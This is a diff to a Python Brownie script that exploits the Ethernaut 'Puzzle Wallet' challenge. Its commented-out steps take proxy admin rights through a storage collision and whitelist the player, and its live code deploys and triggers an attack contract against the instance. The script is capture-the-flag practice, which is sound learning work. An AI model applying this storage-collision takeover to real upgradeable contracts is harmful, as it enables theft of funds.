@@ -1,9 +1,10 @@
-from re import A
 from scripts.helpful_scripts import get_account
 from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0x1A0D1299ECb6538D3700C78c0e163AcBFBC535EC"
+ETHERNAUT_INSTANCE = "0xC665b068D87881B0ef2fFC04E33744D06Bb371A5"
+
+PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
 GAS_LIMIT = 6000000
 
 def initialise(_player, _target):
@@ -25,11 +26,6 @@ def print_storage(_player, _target):
         storage_slot = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, i)
         storage_slot_hex = web3.toHex(storage_slot)
         print(f"storage slot {i}:  {storage_slot_hex}") # slot 0/slot 1 --> (proxy) admin addresses
-
-    # slot_2 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 2)
-    # slot_2_bool = bool(slot_2)
-    # print(f"storage slot 2:  {slot_2}")
-
     player_WL = _target.whitelisted(_player, {"from": _player})
     print(f"Player address on the whitelist: {player_WL}") 
     print("----------------- END ------------------\n")
@@ -61,19 +57,13 @@ def main():
     
     print_storage(player, target)
     
-    # player becomes the owner
     # print(f"\nTaking ownership of PuzzleProxy\n")
     # target.proposeNewAdmin(player, {"from": player})   
     # print_storage(player, target)
-     
-    # add player to the whitelist  
     # print(f"\nAdding player address to the whitelist\n")
     # target.addToWhitelist(player, {"from": player})
     # print_storage(player, target)
         
-    # --> Now perform the multicall attack in Solidity
-    
-    # deploy attack contract
     attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player})
     attack.attack({"from": player})
     
